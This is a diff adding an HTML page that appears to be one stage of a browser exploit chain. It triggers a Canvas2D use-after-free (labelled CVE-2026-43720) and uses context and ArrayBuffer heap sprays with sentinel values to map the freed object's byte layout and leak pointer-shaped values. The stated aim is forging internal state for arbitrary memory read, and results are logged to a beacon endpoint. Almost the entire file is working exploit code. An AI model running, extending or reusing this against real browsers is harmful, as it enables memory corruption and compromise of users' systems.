@@ -1,0 +1,400 @@
+<!--
+  p647: Canvas2D struct layout mapping via same-type sentinel → AB reclaim
+
+  Strategy:
+    Phase 1: Trigger CVE-2026-43720 Canvas UAF (768B freed)
+    Phase 2: Same-type spray 150 Canvas2D contexts → reclaim
+    Phase 3: Write distinctive sentinels to EVERY readable field via alias
+    Phase 4: Free the alias canvas (remove element, null refs) → free 768B again
+    Phase 5: Spray 200×AB(768) → reclaim with Uint8Array views
+    Phase 6: Scan all AB views for sentinel IEEE754 patterns → offset map
+
+  This gives us the EXACT byte offset of each Canvas2D state field within
+  the 768-byte allocation. Required to forge m_stateStack for arbitrary read.
+
+  Sentinels chosen as rare IEEE754 patterns:
+    lineWidth    = 1337.125     → 4094940000000000 (64-bit)
+    miterLimit   = 2674.25      → 40A4E48000000000
+    globalAlpha  = 0.31415      → 3FD41A41F5DEF2B0
+    shadowBlur   = 4011.375     → 40AF5B60000000000
+    shadowOffsetX= 5348.5       → 40B4E28000000000
+    shadowOffsetY= 6685.625     → 40BA1EB400000000
+    lineDashOffset=7022.75      → 40BB6EB000000000
+    transform.a  = 8888.125     → 40C15C1000000000
+    transform.b  = 9999.25      → 40C38F4800000000
+    transform.c  = 1111.375     → 40915CB000000000
+    transform.d  = 2222.5       → 40A15D0000000000
+    transform.e  = 3333.625     → 40AA0AE800000000
+    transform.f  = 4444.75      → 40B159C000000000
+
+  CRASH_CLASS: MODERATE — UAF access on freed/reclaimed memory
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p647 layout map</title></head>
+<body>p647: Canvas2D 768B struct layout mapping
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+var L = document.getElementById('log');
+var bQ = [];
+var retained = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 3) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 6).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P647-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+// IEEE754 helper: double → hex string
+var f64 = new Float64Array(1);
+var u8f = new Uint8Array(f64.buffer);
+function d2hex(d) {
+  f64[0] = d;
+  var h = '';
+  for (var i = 7; i >= 0; i--) h += ('0' + u8f[i].toString(16)).slice(-2);
+  return h;
+}
+
+// Sentinel values (chosen to be distinctive in hex dump)
+var SENTINELS = {
+  lineWidth:      1337.125,
+  miterLimit:     2674.25,
+  globalAlpha:    0.31415,
+  shadowBlur:     4011.375,
+  shadowOffsetX:  5348.5,
+  shadowOffsetY:  6685.625,
+  lineDashOffset: 7022.75,
+  a: 8888.125,
+  b: 9999.25,
+  c: 1111.375,
+  d: 2222.5,
+  e: 3333.625,
+  f: 4444.75
+};
+
+// Pre-compute sentinel patterns for searching
+var sentinelBytes = {};
+for (var name in SENTINELS) {
+  f64[0] = SENTINELS[name];
+  sentinelBytes[name] = [];
+  for (var i = 0; i < 8; i++) sentinelBytes[name].push(u8f[i]);
+}
+
+emit('START', navigator.userAgent ? navigator.userAgent.slice(0,60) : 'no-ua');
+flush();
+
+// ================================================================
+// PHASE 1: Trigger CVE-2026-43720 Canvas UAF
+// ================================================================
+var uafCanvas = document.createElement('canvas');
+uafCanvas.width = 1; uafCanvas.height = 1;
+document.body.appendChild(uafCanvas);
+
+var innerCtx = null;
+var getterFired = false;
+var opts = {};
+Object.defineProperty(opts, 'alpha', {
+  get: function() {
+    getterFired = true;
+    innerCtx = uafCanvas.getContext('2d');
+    return true;
+  }
+});
+
+var outerResult = null;
+try { outerResult = uafCanvas.getContext('bitmaprenderer', opts); } catch(e) {}
+
+emit('P1', 'trigger getter=' + getterFired + ' inner=' + !!innerCtx + ' outer=' + !!outerResult);
+flush();
+
+if (!innerCtx) { emit('ABORT', 'no inner'); flush(); return; }
+
+// ================================================================
+// PHASE 2: Same-type spray — 150 Canvas2D contexts reclaim the 768B slot
+// ================================================================
+var SPRAY = 150;
+var sprayCtxs = [];
+var sprayCanvases = [];
+for (var i = 0; i < SPRAY; i++) {
+  var sc = document.createElement('canvas');
+  sc.width = 1; sc.height = 1;
+  var sctx = sc.getContext('2d');
+  if (sctx) {
+    sctx.lineWidth = 1.0 + i * 0.001;
+    sprayCtxs.push(sctx);
+    sprayCanvases.push(sc);
+    retained.push(sc, sctx);
+  }
+}
+emit('P2', 'sprayed ' + sprayCtxs.length);
+flush();
+
+// ================================================================
+// PHASE 3: Write sentinels via stale innerCtx, find alias
+// ================================================================
+var writeOk = false;
+try {
+  innerCtx.lineWidth = SENTINELS.lineWidth;
+  writeOk = true;
+} catch(e) {
+  emit('P3-CRASH', 'lineWidth write failed: ' + String(e).slice(0,60));
+  flush();
+  return;
+}
+
+var aliasIdx = -1;
+if (writeOk) {
+  for (var i = 0; i < sprayCtxs.length; i++) {
+    if (sprayCtxs[i].lineWidth === SENTINELS.lineWidth) {
+      aliasIdx = i;
+      break;
+    }
+  }
+}
+
+if (aliasIdx < 0) {
+  emit('P3', 'NO ALIAS — write ok but no match');
+  flush();
+  return;
+}
+
+emit('P3', 'ALIAS at spray[' + aliasIdx + ']');
+flush();
+
+// Now write ALL sentinel values via innerCtx
+try {
+  innerCtx.setTransform(SENTINELS.a, SENTINELS.b, SENTINELS.c,
+                         SENTINELS.d, SENTINELS.e, SENTINELS.f);
+  innerCtx.lineWidth = SENTINELS.lineWidth;
+  innerCtx.miterLimit = SENTINELS.miterLimit;
+  innerCtx.globalAlpha = SENTINELS.globalAlpha;
+  innerCtx.shadowBlur = SENTINELS.shadowBlur;
+  innerCtx.shadowOffsetX = SENTINELS.shadowOffsetX;
+  innerCtx.shadowOffsetY = SENTINELS.shadowOffsetY;
+  innerCtx.lineDashOffset = SENTINELS.lineDashOffset;
+} catch(e) {
+  emit('P3-WRITE-ERR', String(e).slice(0,60));
+  flush();
+}
+
+// Verify sentinels readable through alias
+try {
+  var verify = sprayCtxs[aliasIdx];
+  var t = verify.getTransform();
+  emit('P3-VERIFY', 'a=' + t.a + ' lw=' + verify.lineWidth + ' ml=' + verify.miterLimit);
+  flush();
+} catch(e) {
+  emit('P3-VERIFY-ERR', String(e).slice(0,60));
+  flush();
+}
+
+// ================================================================
+// PHASE 4: Free the alias canvas context
+// We want to free the 768B slot that has our sentinels written in it.
+// Strategy: remove the spray canvas from DOM, null the JS refs.
+// The CanvasRenderingContext2D should be freed when the canvas element dies.
+// BUT: JS still holds sprayCtxs[aliasIdx] and sprayCanvases[aliasIdx].
+// We need to let those die too. We'll null them and hope GC collects.
+// ================================================================
+
+// First: record the sentinel hex patterns we expect to find
+var sentinelHexDump = {};
+for (var name in SENTINELS) {
+  sentinelHexDump[name] = d2hex(SENTINELS[name]);
+}
+emit('P4', 'sentinel patterns recorded');
+
+// Null the alias refs - we keep all OTHER spray contexts alive
+// to prevent them from being freed and polluting the target slot
+var aliasCanvas = sprayCanvases[aliasIdx];
+aliasCanvas.remove();
+sprayCtxs[aliasIdx] = null;
+sprayCanvases[aliasIdx] = null;
+
+// Remove from retained too
+for (var ri = retained.length - 1; ri >= 0; ri--) {
+  if (retained[ri] === aliasCanvas || retained[ri] === null) {
+    retained.splice(ri, 1);
+  }
+}
+aliasCanvas = null;
+
+// Force GC
+for (var gi = 0; gi < 200000; gi++) { void new ArrayBuffer(16); }
+
+emit('P4', 'alias freed + GC pressure');
+flush();
+
+// Small delay to let GC run
+setTimeout(function phase5() {
+try {
+
+// ================================================================
+// PHASE 5: AB(768) spray to reclaim the freed slot
+// ================================================================
+var AB_COUNT = 200;
+var abViews = [];
+var abBuffers = [];
+
+for (var ai = 0; ai < AB_COUNT; ai++) {
+  var ab = new ArrayBuffer(768);
+  var view = new Uint8Array(ab);
+  // Fill with index marker to distinguish buffers
+  view[0] = ai & 0xFF;
+  view[1] = (ai >> 8) & 0xFF;
+  abViews.push(view);
+  abBuffers.push(ab);
+}
+
+emit('P5', 'sprayed ' + AB_COUNT + ' AB(768)');
+flush();
+
+// ================================================================
+// PHASE 6: Scan all AB views for sentinel patterns
+// ================================================================
+var hits = {};
+var hitBuf = -1;
+
+function matchBytes(view, offset, pattern) {
+  for (var i = 0; i < pattern.length; i++) {
+    if (view[offset + i] !== pattern[i]) return false;
+  }
+  return true;
+}
+
+for (var ai = 0; ai < abViews.length; ai++) {
+  var view = abViews[ai];
+  var found = false;
+
+  for (var name in sentinelBytes) {
+    var pat = sentinelBytes[name];
+    // Search at every 8-byte aligned offset
+    for (var off = 0; off <= 760; off += 8) {
+      if (matchBytes(view, off, pat)) {
+        if (!hits[name]) hits[name] = [];
+        hits[name].push({ buf: ai, off: off });
+        found = true;
+        if (hitBuf < 0) hitBuf = ai;
+      }
+    }
+  }
+}
+
+// Report findings
+var hitCount = 0;
+var offsets = {};
+for (var name in hits) {
+  hitCount++;
+  var h = hits[name][0];
+  offsets[name] = h.off;
+  emit('P6-HIT', name + ' at buf[' + h.buf + ']+0x' + h.off.toString(16) +
+    ' (' + hits[name].length + ' matches)');
+}
+
+emit('P6-SUMMARY', hitCount + '/' + Object.keys(SENTINELS).length + ' sentinels found');
+flush();
+
+if (hitCount === 0) {
+  emit('P6', 'NO SENTINELS — AB did not reclaim the slot (GC timing?)');
+  flush();
+
+  // Retry: check if innerCtx still works (slot wasn't freed)
+  try {
+    var check = innerCtx.lineWidth;
+    emit('P6-CHECK', 'innerCtx.lineWidth=' + check + ' (slot still alive?)');
+  } catch(e) {
+    emit('P6-CHECK', 'innerCtx read crashed — slot freed but not reclaimed');
+  }
+  flush();
+  emit('P6-HINT', 'try increasing GC pressure or using a timeout before AB spray');
+  flush();
+  return;
+}
+
+// ================================================================
+// PHASE 7: Full hex dump of the hit buffer (if found)
+// ================================================================
+if (hitBuf >= 0) {
+  var hv = abViews[hitBuf];
+  // Dump in 32-byte rows
+  for (var row = 0; row < 768; row += 32) {
+    var hex = '';
+    for (var j = 0; j < 32 && row + j < 768; j++) {
+      hex += ('0' + hv[row + j].toString(16)).slice(-2);
+    }
+    // Mark rows that contain sentinels
+    var mark = '';
+    for (var name in offsets) {
+      if (offsets[name] >= row && offsets[name] < row + 32) {
+        mark += ' <-- ' + name + '(+0x' + offsets[name].toString(16) + ')';
+      }
+    }
+    emit('DUMP', '+0x' + row.toString(16).padStart(3, '0') + ': ' + hex + mark);
+  }
+  flush();
+}
+
+// ================================================================
+// PHASE 8: Check for pointer-shaped values near sentinels
+// (values with high bytes 0x00000010... are heap pointers)
+// ================================================================
+if (hitBuf >= 0) {
+  var hv = abViews[hitBuf];
+  var dv = new DataView(abBuffers[hitBuf]);
+  var ptrs = [];
+
+  for (var off = 0; off < 768; off += 8) {
+    // Read as two 32-bit ints (little-endian)
+    var lo = dv.getUint32(off, true);
+    var hi = dv.getUint32(off + 4, true);
+
+    // Check for heap pointer pattern (0x000000100xxxxxxx)
+    if (hi >= 0x00000010 && hi < 0x00000020) {
+      ptrs.push('+0x' + off.toString(16) + ' = 0x' +
+        hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0'));
+    }
+    // Check for vtable/code pointer (0x000005xxxxxxxxxx)
+    if (hi >= 0x00000050 && hi < 0x00000060) {
+      ptrs.push('+0x' + off.toString(16) + ' = 0x' +
+        hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0') + ' [code?]');
+    }
+  }
+
+  if (ptrs.length > 0) {
+    for (var pi = 0; pi < ptrs.length; pi++) {
+      emit('P8-PTR', ptrs[pi]);
+    }
+  } else {
+    emit('P8', 'no pointer-shaped values found (all sentinel or zero)');
+  }
+  flush();
+}
+
+// ================================================================
+// PHASE 9: Layout summary
+// ================================================================
+emit('P9-LAYOUT', '=== OFFSET MAP ===');
+var sortedNames = Object.keys(offsets).sort(function(a, b) { return offsets[a] - offsets[b]; });
+for (var si = 0; si < sortedNames.length; si++) {
+  var n = sortedNames[si];
+  emit('P9', '+0x' + offsets[n].toString(16) + ' = ' + n + ' (' + SENTINELS[n] + ')');
+}
+emit('P9', 'total mapped: ' + sortedNames.length + '/13 fields');
+flush();
+
+emit('ALIVE', 'all phases complete');
+flush();
+window.__p647 = retained;
+
+} catch(topErr) { emit('FATAL', String(topErr).slice(0, 200)); flush(); }
+}, 500);  // 500ms delay for GC to run
+
+})();
+</script>
+</body></html>
